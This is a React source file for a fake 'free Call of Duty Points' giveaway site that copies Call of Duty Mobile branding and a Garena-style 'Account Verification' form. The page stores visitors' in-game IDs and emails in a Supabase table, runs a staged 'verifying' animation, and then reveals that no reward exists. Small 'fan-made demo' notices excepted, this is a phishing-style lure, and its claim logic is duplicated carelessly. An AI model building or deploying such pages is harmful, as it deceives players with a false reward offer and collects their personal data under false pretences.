import { supabase } from "./lib/supabase";
import React, { useEffect, useState } from "react";
import { createRoot } from "react-dom/client";
import "./styles.css";

/*
=========================================================
ASSETS
=========================================================
*/

const images = {
  logo: "/assets/CODM-logo.png",

  heroVideo:
    "/assets/Call of Duty®_Mobile - Cinematic Trailer.mp4",

  

  packs: {
    80: "/assets/codmcp.png",
    400: "/assets/codmcp.png",
    800: "/assets/codmcp.png",
    2000: "/assets/codmcp.png",
    4000: "/assets/codmcp.png",
    8000: "/assets/codmcp.png",
  },
};

/*
=========================================================
APP / SOCIAL LINKS
=========================================================
*/

const appLinks = {
  appStore: "https://apps.apple.com/",
  googlePlay: "https://play.google.com/",
  facebook: "https://www.facebook.com/",
  instagram: "https://www.instagram.com/",
};

/*
=========================================================
CP PACKS
=========================================================
*/

const packs = [
  {
    cp: 80,
    bonus: 80,
    title: "STARTER PACK",
    subtitle: "Perfect for getting started",
    badge: "FREE",
  },
  {
    cp: 400,
    bonus: 400,
    title: "BATTLE PACK",
    subtitle: "For your next loadout",
    badge: "POPULAR",
  },
  {
    cp: 800,
    bonus: 800,
    title: "ELITE PACK",
    subtitle: "More CP for more rewards",
    badge: "HOT",
  },
  {
    cp: 2000,
    bonus: 2000,
    title: "PRO PACK",
    subtitle: "A serious CP boost",
    badge: "BEST VALUE",
    featured: true,
  },
  {
    cp: 4000,
    bonus: 4000,
    title: "ULTRA PACK",
    subtitle: "For dedicated players",
    badge: "HOT",
  },
  {
    cp: 8000,
    bonus: 8000,
    title: "LEGEND PACK",
    subtitle: "The ultimate reward",
    badge: "MEGA",
  },
];

/*
=========================================================
APP
=========================================================
*/

function App() {
  const [page, setPage] = useState("home");

  const [selectedPack, setSelectedPack] =
    useState(null);

  const [email, setEmail] =
    useState("");

  const [playerId, setPlayerId] =
    useState("");

  const [menuOpen, setMenuOpen] =
    useState(false);

  const [processingStep, setProcessingStep] =
    useState(0);

  /*
  =======================================================
  KEEP PAGE AT TOP WHEN PAGE CHANGES
  =======================================================
  */

  useEffect(() => {
    window.scrollTo({
      top: 0,
      behavior: "smooth",
    });
  }, [page]);

  /*
  =======================================================
  NAVIGATION
  =======================================================
  */

  const goHome = () => {
    setPage("home");
    setMenuOpen(false);

    window.scrollTo({
      top: 0,
      behavior: "smooth",
    });
  };

  const scrollToPacks = () => {
    setPage("home");
    setMenuOpen(false);

    setTimeout(() => {
      document
        .getElementById("packs")
        ?.scrollIntoView({
          behavior: "smooth",
          block: "start",
        });
    }, 100);
  };

  const openSupport = () => {
    setPage("home");
    setMenuOpen(false);

    setTimeout(() => {
      document
        .getElementById("support")
        ?.scrollIntoView({
          behavior: "smooth",
          block: "start",
        });
    }, 100);
  };

  const openStreamer = () => {
    setPage("home");
    setMenuOpen(false);

    setTimeout(() => {
      document
        .getElementById("streamer")
        ?.scrollIntoView({
          behavior: "smooth",
          block: "start",
        });
    }, 100);
  };

  /*
  =======================================================
  SELECT CP PACK
  =======================================================
  */

  const selectPack = (pack) => {
    setSelectedPack(pack);
    setPage("claim");
    setMenuOpen(false);
  };

  /*
  =======================================================
  OPEN CLAIM
  =======================================================
  */

  const openClaim = () => {
    if (!selectedPack) {
      scrollToPacks();
      return;
    }

    setPage("claim");
    setMenuOpen(false);
  };

  /*
  =======================================================
  CLAIM PROCESS + SUPABASE
  =======================================================
  */

  const handleGarenaAuth = async (event) => {
    event.preventDefault();

    if (!selectedPack) {
      scrollToPacks();
      return;
    }

    if (!email.trim() || !playerId.trim()) {
      return;
    }

    /*
    -------------------------------------------------------
    SAVE CLAIM TO SUPABASE
    -------------------------------------------------------
    */

   const { data, error } = await supabase
  .from("claims")
  .insert({
    player_id: playerId.trim(),
    email: email.trim(),
    cp_amount: selectedPack.cp,
    pack_title: selectedPack.title,
    status: "submitted",
  })
  .select();

if (error) {
  console.error("Supabase error:", error);
  alert(`Supabase error: ${error.message}`);
  return;
}

console.log("Claim saved:", data);

setPage("processing");
setProcessingStep(1);

setTimeout(() => setProcessingStep(2), 900);
setTimeout(() => setProcessingStep(3), 1800);
setTimeout(() => setPage("prank"), 2700);
    /*
    -------------------------------------------------------
    HANDLE DATABASE ERROR
    -------------------------------------------------------
    */

    if (error) {
      console.error(
        "Supabase error:",
        error
      );

      return;
    }

    /*
    -------------------------------------------------------
    START PROCESSING ANIMATION
    -------------------------------------------------------
    */

    setPage("processing");
    setProcessingStep(1);

    setTimeout(() => {
      setProcessingStep(2);
    }, 900);

    setTimeout(() => {
      setProcessingStep(3);
    }, 1800);

    setTimeout(() => {
      setPage("prank");
    }, 2700);
  };

  /*
  =======================================================
  RESET
  =======================================================
  */

  const reset = () => {
    setPage("home");

    setSelectedPack(null);

    setEmail("");

    setPlayerId("");

    setProcessingStep(0);

    setMenuOpen(false);

    window.scrollTo({
      top: 0,
      behavior: "smooth",
    });
  };

  /*
  =======================================================
  RENDER
  =======================================================
  */

  return (
    <div className="app">

      {/* =================================================
          NAVIGATION
      ================================================= */}

      <header className="navbar">

        <div className="navInner">

          <button
            className="brand"
            onClick={reset}
            aria-label="CPZONE Home"
          >

            {images.logo ? (
              <img
                src={images.logo}
                alt="CPZONE"
                className="logoImage"
              />
            ) : (
              <div className="fallbackLogo">
                <strong>CP</strong>
                <span>ZONE</span>
              </div>
            )}

          </button>

          <nav
            className={`navLinks ${
              menuOpen ? "open" : ""
            }`}
          >

            <button onClick={goHome}>
              NEWS
            </button>

            <button onClick={scrollToPacks}>
              GAME OVERVIEW
            </button>

            <button onClick={openSupport}>
              SUPPORT
            </button>

            <button onClick={openStreamer}>
              STREAMER
            </button>

          </nav>

          <div className="navRight">

            {/* =================================================
                APP STORE / GOOGLE PLAY
            ================================================= */}

            <div className="storeButtons">

              <a
                className="storeBadge"
                href={appLinks.appStore}
                target="_blank"
                rel="noopener noreferrer"
                aria-label="Download on the App Store"
              >

                <span className="storeIcon">
                  ▶
                </span>

                <div>

                  <small>
                    Download on the
                  </small>

                  <strong>
                    App Store
                  </strong>

                </div>

              </a>

              <a
                className="storeBadge"
                href={appLinks.googlePlay}
                target="_blank"
                rel="noopener noreferrer"
                aria-label="Get it on Google Play"
              >

                <span className="storeIcon">
                  ▶
                </span>

                <div>

                  <small>
                    GET IT ON
                  </small>

                  <strong>
                    Google Play
                  </strong>

                </div>

              </a>

            </div>

            {/* =================================================
                SOCIAL LINKS
            ================================================= */}

            <div className="socialIcons">

              <a
                href={appLinks.facebook}
                target="_blank"
                rel="noopener noreferrer"
                aria-label="Facebook"
              >
                f
              </a>

              <a
                href={appLinks.instagram}
                target="_blank"
                rel="noopener noreferrer"
                aria-label="Instagram"
              >
                ◎
              </a>

            </div>

            {/* =================================================
                MOBILE MENU
            ================================================= */}

            <button
              className="mobileMenu"
              onClick={() =>
                setMenuOpen(!menuOpen)
              }
              aria-label="Menu"
              aria-expanded={menuOpen}
            >
              ☰
            </button>

          </div>

        </div>

      </header>

      {/* =================================================
          HOME
      ================================================= */}

      {page === "home" && (

        <main>

          {/* =================================================
              HERO
          ================================================= */}

          <section className="hero">

            {images.heroVideo && (

              <video
                className="heroBackgroundVideo"
                autoPlay
                muted
                loop
                playsInline
                preload="auto"
                aria-hidden="true"
              >

                <source
                  src={images.heroVideo}
                  type="video/mp4"
                />

                Your browser does not support
                the video element.

              </video>

            )}

            <div className="heroDarkOverlay"></div>

            <div className="heroGradient"></div>

            <div className="heroGlow"></div>

      

            {/* HERO TEXT */}

            <div className="heroContent">

              <div className="heroEyebrow">

                <span></span>

                LIMITED CP EVENT

                <span></span>

              </div>

              <h1>

                POWER UP
                <br />

                YOUR

                <strong>
                  {" "}GAME
                </strong>

              </h1>

              <p>
                Choose your reward and explore
                the available CP packs.
              </p>

              <div className="heroButtons">

                <button
                  className="yellowButton"
                  onClick={scrollToPacks}
                >
                  CLAIM FREE CP
                  <b>▶</b>
                </button>

                <button
                  className="outlineButton"
                  onClick={scrollToPacks}
                >
                  VIEW REWARDS
                </button>

              </div>

            </div>

            {/* =================================================
                HERO REWARD
            ================================================= */}

            <div className="heroReward">

              <div className="rewardTop">

                <span>
                  CP REWARD
                </span>

                <span>
                  FREE EVENT
                </span>

              </div>

              <div className="rewardArtwork">

                {images.packs[8000] ? (

                  <img
                    src={images.packs[8000]}
                    alt="8000 CP"
                  />

                ) : (

                  <div className="rewardCoin">
                    CP
                  </div>

                )}

              </div>

              <strong>
                8,000
              </strong>

              <span className="rewardLabel">
                CALL OF DUTY POINTS
              </span>

              <div className="rewardBottom">

                <span>
                  BONUS
                </span>

                <b>
                  +8,000 CP
                </b>

              </div>

            </div>

            <button
              className="heroArrow"
              onClick={scrollToPacks}
              aria-label="Scroll to rewards"
            >
              ↓
            </button>

          </section>

          {/* =================================================
              FEATURE BAR
          ================================================= */}

          <section className="featureBar">

            <div className="featureItem">

              <span className="featureNumber">
                01
              </span>

              <div>

                <strong>
                  INSTANT CLAIM
                </strong>

                <small>
                  Fast reward process
                </small>

              </div>

            </div>

            <div className="featureItem">

              <span className="featureNumber">
                02
              </span>

              <div>

                <strong>
                  MULTIPLE PACKS
                </strong>

                <small>
                  Choose your reward
                </small>

              </div>

            </div>

            <div className="featureItem">

              <span className="featureNumber">
                03
              </span>

              <div>

                <strong>
                  SIMPLE PROCESS
                </strong>

                <small>
                  Quick claim flow
                </small>

              </div>

            </div>

          </section>

          {/* =================================================
              PACKS
          ================================================= */}

          <section
            className="packsSection"
            id="packs"
          >

            <div className="sectionTop">

              <div>

                <span className="sectionLabel">
                  REWARD CENTER
                </span>

                <h2>

                  SELECT YOUR

                  <span>
                    {" "}CP PACK
                  </span>

                </h2>

              </div>

              <p>
                Choose your preferred reward
                and continue to the claim
                experience.
              </p>

            </div>

            <div className="packsGrid">

              {packs.map((pack) => (

                <article
                  key={pack.cp}
                  className={`packCard ${
                    pack.featured
                      ? "featured"
                      : ""
                  }`}
                >

                  <div className="packCorner"></div>

                  <div className="packHeader">

                    <span>
                      {pack.badge}
                    </span>

                    <i>
                      +
                    </i>

                  </div>

                  <div className="packArtwork">

                    {images.packs[pack.cp] ? (

                      <img
                        src={
                          images.packs[
                            pack.cp
                          ]
                        }
                        alt={`${pack.cp} CP`}
                      />

                    ) : (

                      <div className="defaultCoin">
                        CP
                      </div>

                    )}

                  </div>

                  <div className="packAmount">
                    {pack.cp.toLocaleString()}
                  </div>

                  <div className="packCP">
                    CP
                  </div>

                  <h3>
                    {pack.title}
                  </h3>

                  <p>
                    {pack.subtitle}
                  </p>

                  <div className="packBonus">

                    <span>
                      BONUS REWARD
                    </span>

                    <strong>
                      +
                      {pack.bonus.toLocaleString()}
                      {" "}CP
                    </strong>

                  </div>

                  <button
                    className="packButton"
                    onClick={() =>
                      selectPack(pack)
                    }
                  >
                    CLAIM NOW
                    <b>→</b>
                  </button>

                </article>

              ))}

            </div>

          </section>

          {/* =================================================
              HOW IT WORKS
          ================================================= */}

          <section className="stepsSection">

            <div className="sectionCenter">

              <span className="sectionLabel">
                HOW IT WORKS
              </span>

              <h2>

                THREE SIMPLE

                <span>
                  {" "}STEPS
                </span>

              </h2>

              <p>
                Select your reward and follow
                the claim experience.
              </p>

            </div>

            <div className="stepsGrid">

              <div className="step">

                <span className="stepNumber">
                  01
                </span>

                <div className="stepIcon">
                  ◈
                </div>

                <h3>
                  SELECT A PACK
                </h3>

                <p>
                  Pick one of the available
                  CP rewards.
                </p>

              </div>

              <div className="stepLine"></div>

              <div className="step">

                <span className="stepNumber">
                  02
                </span>

                <div className="stepIcon">
                  G
                </div>

                <h3>
                  ACCOUNT CHECK
                </h3>

                <p>
                  Enter your in-game account
                  information.
                </p>

              </div>

              <div className="stepLine"></div>

              <div className="step">

                <span className="stepNumber">
                  03
                </span>

                <div className="stepIcon">
                  ✦
                </div>

                <h3>
                  REVEAL
                </h3>

                <p>
                  Finish the experience and
                  reveal the surprise.
                </p>

              </div>

            </div>

          </section>

          {/* =================================================
              SUPPORT
          ================================================= */}

          <section
            className="infoSection"
            id="support"
          >

            <span className="sectionLabel">
              SUPPORT
            </span>

            <h2>
              NEED HELP?
            </h2>

            <p>
              This fan-made reward experience
              is designed for demonstration and
              entertainment.
            </p>

            <button
              className="yellowButton"
              onClick={scrollToPacks}
            >
              VIEW REWARDS →
            </button>

          </section>

          {/* =================================================
              STREAMER
          ================================================= */}

          <section
            className="infoSection streamerSection"
            id="streamer"
          >

            <span className="sectionLabel">
              STREAMER
            </span>

            <h2>
              COMMUNITY
            </h2>

            <p>
              Create your own custom artwork and
              use this section for streamer,
              creator, or community content.
            </p>

          </section>

        </main>

      )}

      {/* =================================================
          CLAIM WITHOUT PACK
      ================================================= */}

      {page === "claim" &&
        !selectedPack && (

          <main className="claimPage">

            <div className="claimBox">

              <div className="claimIcon">
                !
              </div>

              <h1>
                SELECT A CP PACK
              </h1>

              <p>
                Select a reward before continuing.
              </p>

              <button
                className="yellowButton"
                onClick={scrollToPacks}
              >
                VIEW CP PACKS →
              </button>

            </div>

          </main>

        )}

      {/* =================================================
          CLAIM PAGE
      ================================================= */}

      {page === "claim" &&
        selectedPack && (

          <main className="claimPage">

            <button
              className="backLink"
              onClick={scrollToPacks}
            >
              ← BACK TO REWARDS
            </button>

            <div className="claimLayout">

              {/* LEFT */}

              <div className="claimInfo">

                <span className="sectionLabel">
                  REWARD SELECTED
                </span>

                <h1>

                  CLAIM YOUR
                  <br />

                  <span>
                    CP REWARD
                  </span>

                </h1>

                <p>
                  Your selected reward is ready.
                  Continue below to proceed.
                </p>

                <div className="selectedPack">

                  <div className="selectedArtwork">

                    {images.packs[
                      selectedPack.cp
                    ] ? (

                      <img
                        src={
                          images.packs[
                            selectedPack.cp
                          ]
                        }
                        alt=""
                      />

                    ) : (

                      <span>
                        CP
                      </span>

                    )}

                  </div>

                  <div>

                    <small>
                      SELECTED PACK
                    </small>

                    <strong>
                      {selectedPack.cp.toLocaleString()}
                      {" "}CP
                    </strong>

                    <span>
                      +
                      {selectedPack.bonus.toLocaleString()}
                      {" "}BONUS CP
                    </span>

                  </div>

                </div>

              </div>

              {/* ACCOUNT FORM */}

              <div className="loginCard">

                <div className="loginHeader">

                  <div className="garenaMark">
                    G
                  </div>

                  <div>

                    <h2>
                      Account Verification
                    </h2>

                    <p>
                      Enter your in-game account
                      information
                    </p>

                  </div>

                </div>

                <form
                  onSubmit={handleGarenaAuth}
                >

                  <label>
                    IN-GAME ID
                  </label>

                  <div className="inputBox">

                    <span>
                      #
                    </span>

                    <input
                      type="text"
                      value={playerId}
                      onChange={(e) =>
                        setPlayerId(
                          e.target.value
                        )
                      }
                      placeholder="Enter your In-Game ID"
                      maxLength={30}
                      inputMode="numeric"
                      autoComplete="off"
                      required
                    />

                  </div>

                  <label>
                    EMAIL ADDRESS
                  </label>

                  <div className="inputBox">

                    <span>
                      @
                    </span>

                    <input
                      type="email"
                      value={email}
                      onChange={(e) =>
                        setEmail(
                          e.target.value
                        )
                      }
                      placeholder="Enter your email"
                      maxLength={100}
                      autoComplete="email"
                      required
                    />

                  </div>

                  <p className="formNotice">
                    Fan-made demo only. Your
                    submission is stored for this
                    demonstration and is not used
                    to access a game account.
                  </p>

                  <button
                    className="loginButton"
                    type="submit"
                  >

                    VERIFY & CONTINUE

                    <span>
                      →
                    </span>

                  </button>

                </form>

              </div>

            </div>

          </main>

        )}

      {/* =================================================
          PROCESSING
      ================================================= */}

      {page === "processing" && (

        <main className="processingPage">

          <div className="processingBox">

            <div className="loadingCoin">
              CP
            </div>

            <span className="sectionLabel">
              REWARD CENTER
            </span>

            <h1>
              VERIFYING
            </h1>

            <p>
              Checking your selected reward...
            </p>

            <div className="processingReward">

              <span>
                SELECTED REWARD
              </span>

              <strong>
                {selectedPack?.cp.toLocaleString()}
                {" "}CP
              </strong>

            </div>

            <div className="progress">

              <div
                style={{
                  width:
                    processingStep === 1
                      ? "35%"
                      : processingStep === 2
                        ? "70%"
                        : "100%",
                }}
              />

            </div>

            <div className="processingList">

              <div
                className={
                  processingStep >= 1
                    ? "active"
                    : ""
                }
              >

                <span>
                  ✓
                </span>

                Checking account information

              </div>

              <div
                className={
                  processingStep >= 2
                    ? "active"
                    : ""
                }
              >

                <span>
                  ✓
                </span>

                Preparing CP reward

              </div>

              <div
                className={
                  processingStep >= 3
                    ? "active"
                    : ""
                }
              >

                <span>
                  ✓
                </span>

                Finalizing claim

              </div>

            </div>

          </div>

        </main>

      )}

      {/* =================================================
          PRANK
      ================================================= */}

      {page === "prank" && (

        <main className="prankPage">

          <div className="prankGlow"></div>

          <div className="prankBox">

            <div className="prankEmoji">
              😎
            </div>

            <span className="sectionLabel">
              CLAIM COMPLETE
            </span>

            <h1>
              GOTCHA!
            </h1>

            <h2>
              You just got pranked.
            </h2>

            <p>
              There was never any CP being
              delivered. This is a fictional
              prank experience.
            </p>

            <div className="prankReward">

              <span>
                SELECTED REWARD
              </span>

              <strong>
                {selectedPack?.cp.toLocaleString()}
                {" "}CP
              </strong>

            </div>

            <button
              className="yellowButton"
              onClick={reset}
            >
              BACK TO HOME →
            </button>

          </div>

        </main>

      )}

      {/* =================================================
          FOOTER
      ================================================= */}

      <footer className="footer">

        <div className="footerInner">

          <div className="footerLogo">
            CPZONE
          </div>

          <div className="footerLinks">

            <button onClick={goHome}>
              NEWS
            </button>

            <button onClick={scrollToPacks}>
              GAME OVERVIEW
            </button>

            <button onClick={openSupport}>
              SUPPORT
            </button>

            <button onClick={openStreamer}>
              STREAMER
            </button>

          </div>

          <p>
            Fan-made promotional concept.
            Not affiliated with Activision,
            Call of Duty: Mobile, or Garena.
          </p>

          <span>
            © 2026 CPZONE
          </span>

        </div>

      </footer>

    </div>
  );
}

/*
=========================================================
RENDER
=========================================================
*/

createRoot(
  document.getElementById("root")
).render(
  <React.StrictMode>
    <App />
  </React.StrictMode>
);